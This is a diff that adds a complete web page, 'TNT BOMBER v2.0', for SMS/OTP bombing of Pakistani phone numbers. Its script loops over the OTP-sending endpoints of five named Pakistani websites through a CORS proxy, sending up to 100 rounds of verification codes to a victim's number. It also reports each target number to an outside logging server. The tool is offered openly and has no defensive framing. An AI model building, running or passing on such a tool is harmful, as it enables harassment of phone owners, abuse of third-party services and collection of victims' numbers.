@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TNT BOMBER v2.0</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Black+Ops+One&family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --bg: #050505;
+            --panel: #0f0f0f;
+            --accent: #ff0000; /* TNT RED */
+            --text: #e0e0e0;
+            --font-head: 'Black Ops One', cursive;
+            --font-mono: 'Roboto Mono', monospace;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
+
+        body {
+            background-color: var(--bg);
+            color: var(--text);
+            font-family: var(--font-mono);
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        .container {
+            width: 90%; max-width: 400px;
+            background: var(--panel);
+            border: 2px solid var(--accent);
+            padding: 30px;
+            border-radius: 12px;
+            text-align: center;
+            box-shadow: 0 0 50px rgba(255, 0, 0, 0.15);
+            position: relative;
+        }
+
+        h1 {
+            font-family: var(--font-head);
+            font-size: 2.8rem;
+            color: var(--accent);
+            margin-bottom: 5px;
+            text-shadow: 0 0 20px var(--accent);
+            letter-spacing: 2px;
+        }
+
+        .credits {
+            font-size: 0.7rem; color: #666;
+            margin-bottom: 30px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .input-group { margin-bottom: 20px; text-align: left; }
+        
+        label {
+            font-size: 0.8rem; color: #888;
+            display: block; margin-bottom: 8px;
+            font-weight: bold;
+        }
+
+        input {
+            width: 100%; padding: 15px;
+            background: #000;
+            border: 1px solid #333;
+            color: var(--accent);
+            font-family: var(--font-mono);
+            font-size: 1.2rem;
+            text-align: center;
+            outline: none;
+            border-radius: 6px;
+            transition: 0.3s;
+        }
+
+        input:focus { border-color: var(--accent); box-shadow: 0 0 15px rgba(255, 0, 0, 0.2); }
+
+        .bomb-btn {
+            width: 100%; padding: 15px;
+            background: var(--accent);
+            color: #000;
+            font-family: var(--font-head);
+            font-size: 1.5rem;
+            border: none;
+            cursor: pointer;
+            border-radius: 6px;
+            margin-top: 10px;
+            transition: 0.2s;
+        }
+
+        .bomb-btn:active { transform: scale(0.95); }
+        .bomb-btn:disabled { background: #333; color: #555; cursor: not-allowed; }
+
+        .log-area {
+            margin-top: 25px;
+            height: 120px;
+            background: #000;
+            border: 1px solid #333;
+            overflow-y: auto;
+            padding: 10px;
+            text-align: left;
+            font-size: 0.7rem;
+            color: #00ff00;
+            font-family: monospace;
+            border-radius: 4px;
+        }
+
+        .log-line { margin-bottom: 4px; border-bottom: 1px solid #111; padding-bottom: 2px; }
+        
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar { width: 5px; }
+        ::-webkit-scrollbar-track { background: #000; }
+        ::-webkit-scrollbar-thumb { background: #333; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>TNT BOMBER</h1>
+        <div class="credits">CREATED BY SHEHZAD & WAHAB</div>
+
+        <div class="input-group">
+            <label>TARGET (Without 0 or +92)</label>
+            <input type="number" id="number" placeholder="3001234567">
+        </div>
+
+        <div class="input-group">
+            <label>ROUNDS (Max: 100)</label>
+            <input type="number" id="amount" placeholder="20" value="10">
+        </div>
+
+        <button class="bomb-btn" id="startBtn" onclick="startAttack()">LAUNCH</button>
+
+        <div class="log-area" id="logs">
+            <div style="color:#666;">[SYSTEM] Waiting for coordinates...</div>
+        </div>
+    </div>
+
+    <script>
+        // TERA PYTHON BACKEND (For Logging)
+        const SERVER_URL = "https://shehzadplayz19.pythonanywhere.com";
+        let isRunning = false;
+
+        // --- TARGET APIs (VIA PROXY) ---
+        // corsproxy.io bypasses the browser restriction
+        const TARGETS = [
+            // Rozee (GET)
+            "https://corsproxy.io/?https://www.rozee.pk/services/jobseeker/send-otp?cell=92{num}",
+            // Sastaticket (GET)
+            "https://corsproxy.io/?https://api.sastaticket.pk/api/v1/auth/send-otp?phone_number=92{num}",
+            // FindMyDoctor (GET)
+            "https://corsproxy.io/?https://www.findmydoctor.pk/api/send_otp.php?phone={num}",
+            // PriceOye (GET - May verify)
+            "https://corsproxy.io/?https://priceoye.pk/api/otp/send?mobile=0{num}",
+            // Shadi (GET)
+            "https://corsproxy.io/?https://www.shadi.org.pk/api/send_otp?mobile=92{num}"
+        ];
+
+        async function startAttack() {
+            const num = document.getElementById('number').value.trim();
+            const count = document.getElementById('amount').value.trim();
+            const btn = document.getElementById('startBtn');
+            
+            if(num.length !== 10) return alert("Enter 10 digit number (Example: 3001234567)");
+            if(!count || count < 1) return alert("Enter valid amount");
+            if(count > 100) return alert("Max limit is 100 to prevent browser crash");
+
+            // 1. Notify Backend (Telegram Log)
+            try {
+                fetch(SERVER_URL + '/api/start_bomb', {
+                    method: 'POST', headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ number: num, count: count })
+                });
+            } catch(e) { console.log("Backend offline, continuing locally..."); }
+
+            isRunning = true;
+            btn.disabled = true;
+            btn.innerText = "ATTACKING...";
+            addLog("Initializing Proxy Chains...");
+
+            let sent = 0;
+            
+            // --- ATTACK LOOP ---
+            for (let i = 0; i < count; i++) {
+                if(!isRunning) break;
+                
+                // Hit APIs concurrently
+                TARGETS.forEach(url => {
+                    const target = url.replace("{num}", num);
+                    
+                    // Fire request
+                    fetch(target)
+                        .then(response => {
+                            // We ignore response because proxy might return opaque
+                        })
+                        .catch(err => {
+                            // Errors are expected due to proxy limits sometimes
+                        });
+                });
+
+                sent++;
+                addLog(`[+] Round ${sent}/${count} Fired`);
+                
+                // Auto-Scroll Logs
+                const logArea = document.getElementById('logs');
+                logArea.scrollTop = logArea.scrollHeight;
+
+                // Delay to prevent browser freeze (2 seconds)
+                await new Promise(r => setTimeout(r, 2000)); 
+            }
+
+            isRunning = false;
+            btn.disabled = false;
+            btn.innerText = "LAUNCH";
+            addLog("Attack Sequence Complete.");
+        }
+
+        function addLog(msg) {
+            const logs = document.getElementById('logs');
+            const div = document.createElement('div');
+            div.className = 'log-line';
+            const time = new Date().toLocaleTimeString();
+            div.innerText = `[${time}] ${msg}`;
+            logs.appendChild(div);
+        }
+    </script>
+
+</body>
+</html>
